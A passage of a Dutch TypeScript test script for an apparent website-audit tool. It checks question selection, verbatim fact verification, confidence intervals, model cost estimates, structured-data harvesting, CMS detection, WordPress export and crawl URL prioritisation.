    contentPieceIds: ["p1"],
  });
  ok("er komt een vraag uit", vraag !== null);
  ok("van de juiste soort", vraag?.kind === "onderscheid");
  ok("met het letterlijke bewijs erin", vraag?.question.includes("€60,00 per sessie") === true);
  ok("merkbreed, want dit geldt voor elke pagina", vraag?.scope === "merk");
  ok("niet verplicht, je moet door kunnen", vraag?.required === false);
  ok("zonder bewijs geen vraag", positioningQuestion({ evidence: [], contentPieceIds: ["p1"] }) === null);
});

group("de gereserveerde plek", () => {
  // Acht inhoudelijk verschillende, verplichte vragen die alle pagina's raken,
  // precies de soort die in productie alle acht plekken innam.
  const onderwerpen = [
    "tarieven vergoeding zorgverzekeraar",
    "wachttijd eerste afspraak inplannen",
    "parkeergelegenheid bereikbaarheid locatie",
    "openingstijden avondbehandeling weekend",
    "verwijsbrief huisarts noodzakelijk",
    "behandelduur intakegesprek minuten",
    "oefenprogramma thuis begeleiding",
    "samenwerking sportclubs trainers",
  ];
  const vulling: BriefingQuestion[] = onderwerpen.map((onderwerp, i) => ({
    claimKey: claimKey(onderwerp),
    question: `Vraag over ${onderwerp}?`,
    reason: "r",
    kind: "verificatie" as const,
    answerType: "ja_nee" as const,
    options: [],
    suggestedAnswer: null,
    required: true,
    scope: "analyse" as const,
    contentPieceIds: ["p1", "p2"],
    priority: 2,
  }));

  const positionering = positioningQuestion({
    evidence: [{ attribute: "prijs", evidence: "Zitting manuele therapie: €60,00 per sessie" }],
    contentPieceIds: ["p1"],
  })!;

  ok(
    "acht verplichte vragen vullen de lijst",
    selectBriefingQuestions({ candidates: vulling, alreadyKnown: new Set() }).length === MAX_QUESTIONS,
  );

  const met = selectBriefingQuestions({
    candidates: [...vulling, positionering],
    alreadyKnown: new Set(),
  });
  ok("nog steeds acht vragen", met.length === MAX_QUESTIONS);
  // Zonder reservering verliest deze vraag altijd: hij is nooit `kern` en raakt
  // zelden alle pagina's, dus de sortering op impact duwt hem er structureel uit.
  // Dat is precies waarom hij 0 van de 62 keer gesteld werd.
  ok("de positioneringsvraag haalt de lijst", met.some((v) => v.kind === "onderscheid"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nMerkdossier: het vangnet (implementatieplan.md S5)");

group("alleen letterlijke antwoorden overleven", () => {
  const document =
    "Tarieven 2026. Zitting manuele therapie 30 min. \u2014 \u20ac 45,00. " +
    "Een eerste consult duurt 45 minuten en is inclusief onderzoek. " +
    "Wij zijn gevestigd aan de Vondelplein 4c in Amersfoort.";

  const goed = verifyDossierFacts(
    [
      {
        question: "Wat kost een zitting manuele therapie?",
        answer: "\u20ac 45,00",
        sourceSentence: "Zitting manuele therapie 30 min. \u2014 \u20ac 45,00.",
        perishable: true,
      },
    ],
    document,
    new Date("2026-07-31T00:00:00Z"),
  );
  ok("een letterlijk bedrag komt door", goed.length === 1);
  ok("herkend als bedrag", goed[0]?.answerType === "bedrag");
  ok("en verloopt over zes maanden", goed[0]?.verifyAfter === "2027-01-31");
  ok("de bronzin blijft bewaard", goed[0]?.sourceSentence.includes("manuele therapie"));

  // Dit is waar de hele module om draait: "\u20ac 45,00" afronden naar "45 euro"
  // is een ander bedrag beloven dan er staat, en de klant wordt daarop
  // afgerekend.
  ok(
    "een afgerond bedrag valt weg",
    verifyDossierFacts(
      [
        {
          question: "Wat kost een zitting manuele therapie?",
          answer: "45 euro",
          sourceSentence: "Zitting manuele therapie 30 min. \u2014 \u20ac 45,00.",
          perishable: true,
        },
      ],
      document,
    ).length === 0,
  );

  ok(
    "een verzonnen bronzin valt weg",
    verifyDossierFacts(
      [
        {
          question: "Wat kost een intake?",
          answer: "\u20ac 45,00",
          sourceSentence: "Onze intake kost \u20ac 45,00 inclusief btw.",
          perishable: true,
        },
      ],
      document,
    ).length === 0,
  );

  // Het F-nummer-probleem van 31 juli, een laag lager: de zin bestaat, maar hij
  // dekt het antwoord niet.
  ok(
    "een bronzin die het antwoord niet bevat valt weg",
    verifyDossierFacts(
      [
        {
          question: "Waar zitten jullie?",
          answer: "Vondelplein 4c",
          sourceSentence: "Een eerste consult duurt 45 minuten en is inclusief onderzoek.",
          perishable: false,
        },
      ],
      document,
    ).length === 0,
  );

  const blijvend = verifyDossierFacts(
    [
      {
        question: "Waar is de praktijk gevestigd?",
        answer: "Vondelplein 4c in Amersfoort",
        sourceSentence: "Wij zijn gevestigd aan de Vondelplein 4c in Amersfoort.",
        perishable: false,
      },
    ],
    document,
  );
  ok("een blijvend feit krijgt geen vervaldatum", blijvend[0]?.verifyAfter === null);

  ok(
    "twee formuleringen van dezelfde vraag leveren \u00e9\u00e9n feit",
    verifyDossierFacts(
      [
        {
          question: "Wat kost een zitting manuele therapie?",
          answer: "\u20ac 45,00",
          sourceSentence: "Zitting manuele therapie 30 min. \u2014 \u20ac 45,00.",
          perishable: true,
        },
        {
          question: "Wat kost manuele therapie per zitting?",
          answer: "\u20ac 45,00",
          sourceSentence: "Zitting manuele therapie 30 min. \u2014 \u20ac 45,00.",
          perishable: true,
        },
      ],
      document,
    ).length === 1,
  );
});

group("antwoordtype afleiden", () => {
  ok("bedrag", answerTypeOf("\u20ac 45,00") === "bedrag");
  ok("getal", answerTypeOf("22") === "getal");
  ok("url", answerTypeOf("https://fysi-unique.nl/tarieven") === "url");
  ok("korte tekst", answerTypeOf("binnen 1 werkdag") === "tekst_kort");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nWinbaarheid als kans (R7 / migratie 0037)");

group("het betrouwbaarheidsinterval", () => {
  // Dit is waar het om draait: bij 0 successen geeft de normaalbenadering een
  // interval van nul breed ("0%, absoluut zeker"), en dan haalt elke drempel het
  // meteen. Wilson houdt hem eerlijk breed.
  const na2 = wilsonBounds({ successes: 0, samples: 2 });
  ok("0 van 2 zegt bijna niets", na2.high > 0.6, `bovengrens ${na2.high.toFixed(2)}`);

  const na12 = wilsonBounds({ successes: 0, samples: 12 });
  ok("0 van 12 zegt wél iets", na12.high < 0.3, `bovengrens ${na12.high.toFixed(2)}`);
  ok("maar nooit absolute zekerheid", na12.high > 0);

  const helft = wilsonBounds({ successes: 6, samples: 12 });
  ok("6 van 12 ligt rond de helft", helft.low < 0.5 && helft.high > 0.5);
});

group("wanneer een vraag mag vervallen", () => {
  // De negen vragen die op productie op 'nee' staan hebben allemaal precies twee
  // metingen. Onder de oude regel verdwenen ze; onder de nieuwe komen ze terug.
  ok("0 van 2 is niet genoeg om te schrappen", !maySkip({ successes: 0, samples: 2 }));
  ok("0 van 8 nog steeds niet", !maySkip({ successes: 0, samples: 8 }));
  ok("0 van 12 wel", maySkip({ successes: 0, samples: 12 }));
  // Een vraag die één op de drie keer raak is, mag nooit verdwijnen. Dat is
  // precies de vraag die de contentronde liet zien.
  ok("4 van 12 mag nooit vervallen", !maySkip({ successes: 4, samples: 12 }));
  // Wél vervallen bij véél bewijs van bijna niets: 1 op 30 is 3%, en dertig
  // metingen is genoeg om dat te durven zeggen.
  ok("1 van 30 mag wel", maySkip({ successes: 1, samples: 30 }));
});

group("de afgeleide vlag", () => {
  ok("te weinig metingen blijft onbekend", elicitLabel({ successes: 0, samples: 2 }) === "onbekend");
  ok("ooit raak is ja", elicitLabel({ successes: 1, samples: 9 }) === "ja");
  ok("lang niets is nee", elicitLabel({ successes: 0, samples: 12 }) === "nee");
  // De oude regel zei hier 'nee' na twee nulmetingen. Dat is precies de fout.
  ok("maar niet na twee nulmetingen", elicitLabel({ successes: 0, samples: 2 }) !== "nee");

  ok(
    "de omschrijving noemt het interval",
    describeElicit({ successes: 1, samples: 3 }).includes("tussen"),
  );
  ok("zonder metingen geen getal", describeElicit({ successes: 0, samples: 0 }) === "nog niet gemeten");
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nFeiten samenvoegen met de feitenbank (migratie 0036)");

group("nieuw, ongewijzigd en vervangen", () => {
  const bestaand: StoredFact[] = [
    {
      id: "f-oud",
      text: "Zit pechhulp in het maandbedrag: NEE",
      source: "klant, bevestigd 29-07-2026",
      kind: "klant",
      citable: true,
      allowed: false,
      factKey: "bedrag inbegrepen maandbedrag pechhulp zit",
    },
  ];

  const zelfde: IncomingFact = {
    text: "Zit pechhulp in het maandbedrag: NEE",
    source: "klant, bevestigd 29-07-2026",
    kind: "klant",
    citable: true,
    allowed: false,
    factKey: "bedrag inbegrepen maandbedrag pechhulp zit",
  };
  const ongewijzigd = planFactMerge(bestaand, [zelfde]);
  ok("hetzelfde feit blijft staan", ongewijzigd.unchanged.length === 1);
  ok("en levert geen tegenspraak op", ongewijzigd.contradictions.length === 0);

  // Het scherpste geval: de klant draait zijn antwoord om. Vóór 0036 stonden
  // beide antwoorden op de kaart en mocht het model kiezen.
  const omgedraaid: IncomingFact = { ...zelfde, text: "Zit pechhulp in het maandbedrag: ja", allowed: true };
  const conflict = planFactMerge(bestaand, [omgedraaid]);
  ok("een omgedraaid antwoord vervangt het oude", conflict.supersede.length === 1);
  ok("het oude feit wordt niet verwijderd", conflict.supersede[0]?.oldId === "f-oud");
  ok("en het telt als tegenspraak", conflict.contradictions.length === 1);
  ok("herkend als omkering", conflict.contradictions[0]?.omgekeerd === true);
  ok("en als afkomstig van de klant", conflict.contradictions[0]?.vanKlant === true);

  const nieuw: IncomingFact = { ...zelfde, text: "Kortste looptijd: 12 maanden", factKey: "kortste looptijd maanden" };
  const toegevoegd = planFactMerge(bestaand, [nieuw]);
  ok("een onbekend feit komt erbij", toegevoegd.insert.length === 1);
  ok("zonder iets te vervangen", toegevoegd.supersede.length === 0);
});

group("wat de klant hierover leest", () => {
  const regels = describeContradictions([
    {
      factKey: "k",
      oud: "Zit pechhulp in het maandbedrag: NEE",
      nieuw: "Zit pechhulp in het maandbedrag: ja",
      vanKlant: true,
      omgekeerd: true,
    },
    // Een sitewijziging is meestal gewoon een update; die hoeft de klant niet
    // lastig te vallen.
    { factKey: "s", oud: "22 winkels", nieuw: "23 winkels", vanKlant: false, omgekeerd: false },
  ]);
  ok("de omkering wordt gemeld", regels.length === 1);
  ok("met beide teksten erin", regels[0].includes("NEE") && regels[0].includes("ja"));
});

// ════════════════════════════════════════════════════════════════════════════
console.log("\nModelparameters en kosten (GPT-5.6-overstap, augustus 2026)");

group("welk model redeneert", () => {
  ok("luna", isReasoningModel("gpt-5.6-luna"));
  ok("sol", isReasoningModel("gpt-5.6-sol"));
  ok("terra", isReasoningModel("gpt-5.6-terra"));
  ok("o3", isReasoningModel("o3-mini"));
  ok("gpt-4.1 niet", !isReasoningModel("gpt-4.1"));
  ok("gpt-4.1-nano niet", !isReasoningModel("gpt-4.1-nano"));
  // Alle drie de tiers die de app draait moeten in dezelfde tak vallen: anders
  // krijgt de content-stap stilzwijgend andere parameters dan de rest.
  ok("alle tiers van de app", Object.values(MODELS).every(isReasoningModel));
});

group("soort werk → parameters", () => {
  const det = resolveTuning(MODELS.volume, "deterministic");
  ok("classificeren redeneert niet", det.reasoningEffort === "none");
  ok("en blijft op temperatuur 0", det.temperature === 0);

  const ana = resolveTuning(MODELS.quality, "analytical");
  ok("analyseren krijgt redeneertijd", ana.reasoningEffort === "low");
  // De kern van deze hele laag: bij effort > none weigert de API `temperature`.
  // Gaat dit stuk, dan valt élke onderzoeks-, rapport- en gap-call om.
  ok("en stuurt géén temperatuur mee", ana.temperature === undefined);

  const cre = resolveTuning(MODELS.quality, "creative");
  ok("promptgeneratie mag zwerven", cre.temperature === 0.8 && cre.reasoningEffort === "none");

  const con = resolveTuning(MODELS.content, "content");
  ok("content krijgt redeneertijd", con.reasoningEffort === "medium");
  ok("zonder temperatuur", con.temperature === undefined);

  const sim = resolveTuning(MODELS.quality, "simulation");
  ok("de meting draait op de modelstandaard", sim.temperature === undefined && sim.reasoningEffort === undefined);
});

group("terugval als de API de temperatuur weigert", () => {
  const uit = resolveTuning(MODELS.volume, "deterministic", false);
  ok("temperatuur verdwijnt", uit.temperature === undefined);
  ok("maar de effort blijft staan", uit.reasoningEffort === "none");

  // Een niet-redeneermodel houdt zijn oude gedrag: temperatuur zoals bedoeld,
  // geen effort. Zo blijft een vergelijking tegen gpt-4.1 eerlijk.
  const oud = resolveTuning("gpt-4.1-mini", "analytical");
  ok("gpt-4.1 houdt zijn temperatuur", oud.temperature === 0.2);
  ok("en krijgt geen effort", oud.reasoningEffort === undefined);
});

group("herkennen van een geweigerde temperatuur", () => {
  ok(
    "unsupported parameter",
    isUnsupportedTemperatureError({
      status: 400,
      error: { param: "temperature", message: "Unsupported parameter: 'temperature'." },
    }),
  );
  ok(
    "does not support",
    isUnsupportedTemperatureError({ status: 400, message: "This model does not support temperature." }),
  );
  // Valse herkenning is erger dan een gemiste: dan zetten we de temperatuur
  // voorgoed uit om een fout die er niets mee te maken had.
  ok("niet bij een andere 400", !isUnsupportedTemperatureError({ status: 400, message: "Invalid schema." }));
  ok(
    "niet bij een 429 over temperatuur",
    !isUnsupportedTemperatureError({ status: 429, message: "rate limit (temperature)" }),
  );
  ok("niet bij null", !isUnsupportedTemperatureError(null));
});

group("kosten per model", () => {
  ok("luna staat in de tabel", hasKnownRate("gpt-5.6-luna"));
  ok("sol staat in de tabel", hasKnownRate("gpt-5.6-sol"));
  ok("gpt-4.1 blijft narekenbaar", hasKnownRate("gpt-4.1"));

  // 1M in + 1M uit op Luna = $0,20 + $1,20.
  const luna = estimateCostUsd({ model: "gpt-5.6-luna", inputTokens: 1e6, outputTokens: 1e6, webSearch: false });
  ok("luna 1M+1M = $1,40", Math.abs(luna - 1.4) < 1e-6, `${luna}`);

  const sol = estimateCostUsd({ model: "gpt-5.6-sol", inputTokens: 1e6, outputTokens: 1e6, webSearch: false });
  ok("sol 1M+1M = $35", Math.abs(sol - 35) < 1e-6, `${sol}`);

  // Een zoekactie kost op een redeneermodel $0,010 en op de niet-redeneerpreview
  // $0,025. Dit is de grootste kostenpost van de meting, dus het verschil telt:
  // 30 vragen × $0,015 scheelt $0,45 per ronde.
  const zoekNieuw = estimateCostUsd({ model: "gpt-5.6-luna", inputTokens: 0, outputTokens: 0, webSearch: true });
  ok("zoekactie op luna = $0,010", Math.abs(zoekNieuw - 0.01) < 1e-6, `${zoekNieuw}`);
  const zoekOud = estimateCostUsd({ model: "gpt-4.1-mini", inputTokens: 0, outputTokens: 0, webSearch: true });
  ok("zoekactie op gpt-4.1 = $0,025", Math.abs(zoekOud - 0.025) < 1e-6, `${zoekOud}`);

  // Onbekend model → de dure terugval (Sol-tarief), nooit stil een te laag bedrag.
  const onbekend = estimateCostUsd({ model: "gpt-6-mystery", inputTokens: 1e6, outputTokens: 0, webSearch: false });
  ok("onbekend model rekent duur", Math.abs(onbekend - 5) < 1e-6, `${onbekend}`);
});

group("gestructureerde data oogsten (fase 0, nul API-kosten)", () => {
  const html = `
    <html><head>
      <title>Fysi-Unique — fysiotherapie Amersfoort</title>
      <meta property="og:site_name" content="Fysi Unique" />
      <script type="application/ld+json">
      {"@context":"https://schema.org","@type":"LocalBusiness","name":"Fysi-Unique Fysiotherapie",
       "telephone":"033 123 4567","priceRange":"€€",
       "address":{"@type":"PostalAddress","streetAddress":"Stationsweg 1","postalCode":"3811 MH","addressLocality":"Amersfoort"},
       "openingHours":["Mo-Fr 08:00-18:00"],
       "sameAs":["https://www.linkedin.com/company/fysi-unique","https://nl.wikipedia.org/wiki/Fysiotherapie"],
       "aggregateRating":{"@type":"AggregateRating","ratingValue":"9.4","reviewCount":"87"}}
      </script>
      <script type="application/ld+json">{ dit is kapotte json </script>
    </head><body><p>Welkom</p></body></html>`;

  const h = harvestStructuredData(html);
  const waarde = (k: string) => h.facts.find((f) => f.key === k)?.value;

  ok("het type is herkend", h.types.includes("LocalBusiness"), h.types.join(","));
  ok("de naam komt eruit", waarde("naam") === "Fysi-Unique Fysiotherapie", waarde("naam"));
  ok("het telefoonnummer komt eruit", waarde("telefoon") === "033 123 4567");
  // Het adres komt als genest object binnen en moet één leesbare regel worden.
  ok(
    "het adres wordt één regel",
    waarde("adres") === "Stationsweg 1, 3811 MH, Amersfoort",
    waarde("adres"),
  );
  ok("openingstijden komen eruit", waarde("openingstijden") === "Mo-Fr 08:00-18:00");
  // Een beoordeling is een van de sterkste trust-signalen en zit vrijwel altijd
  // in een genest object. Precies het geval waar een platte parser op stukloopt.
  ok(
    "de beoordeling krijgt het aantal erbij",
    waarde("beoordeling") === "9.4 (87 beoordelingen)",
    waarde("beoordeling"),
  );
  ok("sameAs levert twee profielen", h.sameAs.length === 2, String(h.sameAs.length));

  // Twee schrijfwijzen van dezelfde naam: dát is wat de entiteitsconsistentie-
  // check straks moet melden, dus ze moeten allebei bewaard blijven.
  ok(
    "beide naamvarianten blijven staan",
    h.names.includes("Fysi-Unique Fysiotherapie") && h.names.includes("Fysi Unique"),
    h.names.join(" | "),
  );

  // Eén kapot JSON-LD-blok is doodnormaal op een MKB-site met plugins. Het mag
  // het goede blok niet meeslepen.
  ok("kapotte JSON-LD sloopt de rest niet", extractJsonLdBlocks(html).length === 1);

  ok("metatags worden gelezen", extractMetaTags(html)["og:site_name"] === "Fysi Unique");
});

group("@graph en dubbele feiten", () => {
  const html = `<script type="application/ld+json">
    {"@graph":[{"@type":"Organization","name":"Acme"},{"@type":"WebSite","name":"Acme"}]}
    </script>`;
  const h = harvestStructuredData(html);
  ok("@graph wordt uitgevlakt", h.types.includes("Organization") && h.types.includes("WebSite"));
  // Dezelfde organisatie staat vaak in élk blok van élke pagina; zonder
  // ontdubbeling loopt de feitenlijst vol met identieke regels.
  ok("dezelfde naam telt één keer", h.facts.filter((f) => f.key === "naam").length === 1);
});

group("draait de site op JavaScript? (de zwaarste bevinding die er is)", () => {
  // AI-crawlers voeren geen JS uit: staat de tekst niet in de HTML, dan bestaat
  // de pagina voor ChatGPT niet, hoe goed de content ook is.
  const spa = `<html><body><div id="root"></div><script>${"x".repeat(50_000)}</script></body></html>`;
  ok("een lege SPA-shell valt op", assessRendering(spa, 12).likelyClientRendered);

  const gewoon = `<html><body>${"tekst ".repeat(300)}<script>var a=1;</script></body></html>`;
  ok("een gewone pagina niet", !assessRendering(gewoon, 1800).likelyClientRendered);

  // Randgeval: weinig tekst maar ook nauwelijks script. Dat is een dunne
  // pagina, geen JavaScript-probleem, en het advies verschilt.
  ok(
    "weinig tekst zonder script is geen JS-probleem",
    !assessRendering("<html><body>Kort.</body></html>", 5).likelyClientRendered,
  );
});

group("sjabloondetectie: welk CMS, en welke blokken (fase 0, nul API-kosten)", () => {
  const wordpress = `<html><head><meta name="generator" content="WordPress 6.4" /></head>
    <body><script src="/wp-content/themes/twentytwentyfour/script.js"></script>
    <h1>Titel</h1><h2>Sectie</h2>
    <details><summary>Wat kost dit?</summary><p>Antwoord</p></details>
    </body></html>`;
  const wp = detectPageTemplate(wordpress);
  ok("herkent WordPress aan wp-content", wp.cms === "wordpress", wp.cms);
  ok("herkent de <details>-accordion als FAQ", wp.heeftFaqAccordion);
  ok("telt twee kopniveaus (H1+H2)", wp.headingNiveaus === 2, String(wp.headingNiveaus));
  ok("geen citaatblok gevonden", !wp.heeftCitaatblok);

  const shopify = `<html><body><script src="https://cdn.shopify.com/s/files/1/theme.js"></script>
    <h1>Winkel</h1></body></html>`;
  ok("herkent Shopify aan de cdn", detectPageTemplate(shopify).cms === "shopify");

  const custom = `<html><body><h1>Over ons</h1><blockquote>Top bedrijf!</blockquote></body></html>`;
  const c = detectPageTemplate(custom);
  ok("custom site geeft geen CMS", c.cms === "onbekend", c.cms);
  ok("herkent het citaatblok", c.heeftCitaatblok);
  ok("geen FAQ-accordion op deze pagina", !c.heeftFaqAccordion);

  // Twee wp-pagina's en één losse widget van een ander domein: het sitebeeld
  // mag niet omslaan naar de zeldzame afwijkende pagina.
  const agg = aggregateTemplateProfile([wp, wp, detectPageTemplate(shopify)]);
  ok("meerderheid wint bij het samenvoegen", agg.cms === "wordpress", agg.cms);
  ok("FAQ-accordion telt zodra ÉÉN pagina hem heeft", agg.heeftFaqAccordion);
  ok("headingNiveaus is het maximum over de pagina's", agg.headingNiveaus === 2, String(agg.headingNiveaus));
  ok("pagesAnalysed telt mee", agg.pagesAnalysed === 3);

  // Geen enkele pagina geanalyseerd: eerlijk "onbekend", geen gegokt CMS.
  const leeg = aggregateTemplateProfile([]);
  ok("zonder pagina's blijft alles onbekend/nul", leeg.cms === "onbekend" && leeg.pagesAnalysed === 0);

  ok(
    "de samenvatting noemt het CMS en de FAQ",
    templateSummary(agg).includes("WordPress") && templateSummary(agg).includes("FAQ"),
    templateSummary(agg),
  );
  ok("zonder pagina's een expliciete melding", templateSummary(leeg).includes("Nog geen"));
});

group("content-export: dezelfde inhoud, andere technische vorm", () => {
  const piece = {
    title: "Wat kost een cv-ketel?",
    bodyMarkdown: "## Prijzen\n\nEen **nieuwe** ketel kost al snel > € 1.500.\n\n- Model A\n- Model B",
    faq: [{ q: "Is dit inclusief installatie?", a: "Ja, altijd." }],
  };

  // Onbekend CMS, geen FAQ-accordion op de site: de bestaande generieke export
  // is dan al het beste wat er is, dus GEEN extra, misleidende knop.
  ok(
    "zonder herkend sjabloon geen exportoptie",
    buildTemplateExport(piece, { cms: "onbekend", heeftFaqAccordion: false, heeftCitaatblok: false, headingNiveaus: 1, pagesAnalysed: 4 }) === null,
  );
  ok("zonder enige analyse geen exportoptie", buildTemplateExport(piece, null) === null);

  // Custom site met een FAQ-accordion: alleen de FAQ krijgt de accordion-vorm.
  const faqOnly = buildTemplateExport(piece, {
    cms: "onbekend",
    heeftFaqAccordion: true,
    heeftCitaatblok: false,
    headingNiveaus: 2,
    pagesAnalysed: 4,
  });
  ok("biedt een FAQ-accordion-export", faqOnly !== null && faqOnly.content.includes("<details>"));
  ok(
    "de vraag staat in de summary",
    faqOnly !== null && faqOnly.content.includes("Is dit inclusief installatie?"),
  );

  // WordPress: de hele pagina als Gutenberg-blokken, FAQ als Aangepast-HTML-blok.
  const wp = buildTemplateExport(piece, {
    cms: "wordpress",
    heeftFaqAccordion: true,
    heeftCitaatblok: false,
    headingNiveaus: 2,
    pagesAnalysed: 6,
  });
  ok("WordPress-export bestaat", wp !== null);
  ok("bevat een heading-blok", wp !== null && wp.content.includes('<!-- wp:heading {"level":2} -->'));
  ok("bevat een paragraph-blok", wp !== null && wp.content.includes("<!-- wp:paragraph -->"));
  ok("bevat een lijst-blok", wp !== null && wp.content.includes("<!-- wp:list -->"));
  ok("FAQ zit in een Aangepast-HTML-blok", wp !== null && wp.content.includes("<!-- wp:html -->") && wp.content.includes("<details>"));
  ok("bestandsnaam is een leesbare slug", wp !== null && wp.filename === "wat-kost-een-cv-ketel-wordpress.html", wp?.filename);

  // De markdown→Gutenberg-vertaling zelf, los van de knop eromheen.
  const blocks = markdownToGutenbergBlocks("# Kop\n\nGewone alinea.\n\n> Een citaat.\n\n1. Eerst\n2. Dan");
  ok("kop wordt een heading-blok", blocks.includes('<!-- wp:heading {"level":1} -->'));
  ok("alinea wordt een paragraph-blok", blocks.includes("<p>Gewone alinea.</p>"));
  ok("citaat wordt een quote-blok", blocks.includes("<!-- wp:quote -->"));
  ok("genummerde lijst krijgt het ordered-attribuut", blocks.includes('{"ordered":true}'));
  // HTML wordt eerst ge-escaped: een "<" in de brontekst mag geen kapot blok geven.
  const veilig = markdownToGutenbergBlocks("Prijs is < € 10");
  ok("HTML-tekens in de tekst worden ge-escaped", veilig.includes("&lt;"), veilig);
});

group("productpagina-heuristiek (R6.2)", () => {
  // Bij HEMA eindigt elke productpagina op een artikelnummer: -200302.html
  ok("HEMA-artikelnummer", looksLikeProductPage("https://hema.nl/koken/pan-200302.html"));
  ok("Shopify-pad", looksLikeProductPage("https://shop.nl/products/blauwe-trui"));
  ok("Nederlands productpad", looksLikeProductPage("https://winkel.nl/producten/fiets"));
  ok("diep pad met nummer", looksLikeProductPage("https://a.nl/b/c/d/item-4821"));

  // Deze mogen NIET als product tellen: het zijn juist de inhoudelijke
  // pagina's waar het contentadvies op moet rusten.
  ok("dienstenpagina niet", !looksLikeProductPage("https://praktijk.nl/diensten/sportmassage"));
  ok("blog niet", !looksLikeProductPage("https://praktijk.nl/blog/hardlopen-in-de-winter"));
  ok("homepage niet", !looksLikeProductPage("https://praktijk.nl/"));
});

// ════════════════════════════════════════════════════════════════════════════
// De URL-laag van de crawler. Deze regels stonden tot 22 augustus 2026 in
// `lib/crawler.ts`, en dat bestand begint met `import "server-only"`: dit
// script kon er dus niet bij, en geen enkele regel had een test. Precies de
// valkuil die het commentaar zelf benoemde (product-category-sitemap.xml) was
// onbewaakt.
// ════════════════════════════════════════════════════════════════════════════

group("crawl-urls: welke sitemaps en URL's we overslaan", () => {
  ok("Shopify-productsitemap", isProductSitemap("https://s.nl/sitemap_products_1.xml"));
  ok("Yoast-productsitemap", isProductSitemap("https://s.nl/product-sitemap.xml"));
  ok("meervoud met streepje", isProductSitemap("https://s.nl/products-sitemap.xml"));

  // ⚠️ DE VALKUIL. Categoriepagina's zijn juist waardevol: die beschrijven het
  // assortiment, terwijl losse artikelen dat niet doen.
  ok(
    "product-category-sitemap NIET overslaan",
    !isProductSitemap("https://s.nl/product-category-sitemap.xml"),
  );
  ok("gewone paginasitemap niet", !isProductSitemap("https://s.nl/page-sitemap.xml"));

  ok("losse productpagina", isProductUrl("https://s.nl/products/blauwe-trui"));
  ok("categoriepagina blijft", !isProductUrl("https://s.nl/collections/truien"));

  ok("www telt als zelfde domein", sameDomain("https://www.a.nl/x", "a.nl"));
  ok("subdomein niet", !sameDomain("https://shop.a.nl/x", "a.nl"));
  ok("ander domein niet", !sameDomain("https://b.nl/x", "a.nl"));

  eq("sectie van een diepe URL", sectionOf("https://a.nl/diensten/massage/sport"), "/diensten");
  eq("sectie van de homepage", sectionOf("https://a.nl/"), "/");

  const index = `<sitemapindex><sitemap><loc>https://a.nl/page-sitemap.xml</loc></sitemap></sitemapindex>`;
  ok("index herkend", isSitemapIndex(index));
  eq("loc uitgelezen", extractLocs(index).join(""), "https://a.nl/page-sitemap.xml");
  // Een sitemap-URL met een query bevat &amp;, en die moet terug naar &.
  eq(
    "XML-entiteit gedecodeerd",
    extractLocs("<loc>https://a.nl/x?a=1&amp;b=2</loc>")[0],
    "https://a.nl/x?a=1&b=2",
  );
});

group("crawl-urls: een geplakte lijst adressen uitlezen", () => {
  const lijst = parseUrlList(
    `https://praktijk.nl/diensten/dry-needling
     praktijk.nl/tarieven
     - "https://www.praktijk.nl/over-ons"
     https://concurrent.nl/diensten
     dit is geen adres`,
    "praktijk.nl",
  );

  ok("volledig adres", lijst.urls.includes("https://praktijk.nl/diensten/dry-needling"));
  ok("adres zonder https", lijst.urls.includes("https://praktijk.nl/tarieven"));
  ok("met opsommingsteken en aanhalingstekens", lijst.urls.includes("https://www.praktijk.nl/over-ons"));
  ok("ander domein geweigerd", lijst.rejected.some((r) => r.value.includes("concurrent.nl")));
  // "dit is geen adres" valt uiteen in vier losse woorden zonder punt; alle vier
  // horen ze met een reden terug te komen en niet stil te verdwijnen.
  ok("onzin geweigerd, met reden", lijst.rejected.some((r) => r.reason === "Dit is geen webadres."));
  eq("drie bruikbare adressen", String(lijst.urls.length), "3");

  const dubbel = parseUrlList("praktijk.nl/x\nhttps://praktijk.nl/x", "praktijk.nl");
  eq("dubbel adres maar één keer", String(dubbel.urls.length), "1");

  const teveel = parseUrlList(
    Array.from({ length: 5 }, (_, i) => `praktijk.nl/p${i}`).join("\n"),
    "praktijk.nl",
    3,
  );
  eq("boven het maximum afgekapt", String(teveel.urls.length), "3");
  ok("en dat wordt gemeld", teveel.rejected.length === 2);
});

// ════════════════════════════════════════════════════════════════════════════
// Welke pagina's de crawl kiest als de site te groot is. Dit is de kern van de
// reparatie van 22 augustus 2026: niet MEER pagina's ophalen, maar ANDERE.
// ════════════════════════════════════════════════════════════════════════════

group("url-priority: wat een pagina waard is", () => {
  const homepage = scoreUrl("https://a.nl/");
  const dienst = scoreUrl("https://a.nl/diensten/dry-needling");
  const overOns = scoreUrl("https://a.nl/over-ons");
  const blog = scoreUrl("https://a.nl/blog/hardlopen-in-de-winter");

  ok("de homepage wint altijd", homepage > dienst && homepage > overOns);
  ok("een dienst boven een over-ons", dienst > overOns);
  ok("een over-ons boven een blogartikel", overOns > blog);

  // ⚠️ Het woord "diensten" in een blog-slug mag de sectie niet overstemmen.
  ok(
    "blogartikel over diensten blijft een blogartikel",
    scoreUrl("https://a.nl/blog/onze-diensten-uitgelegd") < overOns,
  );

  // "onze-diensten" is de vorm die echte sites gebruiken; op hele segmentnamen
  // vergelijken zou die missen.
  ok("onze-diensten telt als aanbod", scoreUrl("https://a.nl/onze-diensten") > overOns);

  ok(
    "een expliciet gekozen map wint van alles behalve de homepage",
    scoreUrl("https://a.nl/showroom/x", ["/showroom"]) > dienst,
  );

  ok("dieper is minder", scoreUrl("https://a.nl/diensten/a/b/c") < dienst);
});

group("url-priority: de Yoast-val (2000 blogs, 12 diensten)", () => {
  // Dit is het geval waarvoor dit bestand bestaat. Bij Yoast staat
  // post-sitemap.xml vóór page-sitemap.xml, dus de oude `slice(0, 150)` op
  // sitemapvolgorde leverde 150 blogartikelen op en nul dienstenpagina's.
  const blogs = Array.from({ length: 2000 }, (_, i) => `https://a.nl/blog/artikel-${i}`);
  const diensten = Array.from({ length: 12 }, (_, i) => `https://a.nl/diensten/dienst-${i}`);
  const overig = ["https://a.nl/", "https://a.nl/over-ons", "https://a.nl/contact"];

  const keuze = selectUrls([...blogs, ...diensten, ...overig], 150);

  eq("het ware aantal wordt geteld", String(keuze.totalFound), "2015");
  ok("en afkapping wordt gemeld", keuze.truncated);
  eq("er worden er precies 150 gekozen", String(keuze.urls.length), "150");

  const gekozenDiensten = keuze.urls.filter((u) => u.includes("/diensten/"));
  ok(
    `alle 12 dienstenpagina's overleven (${gekozenDiensten.length}/12)`,
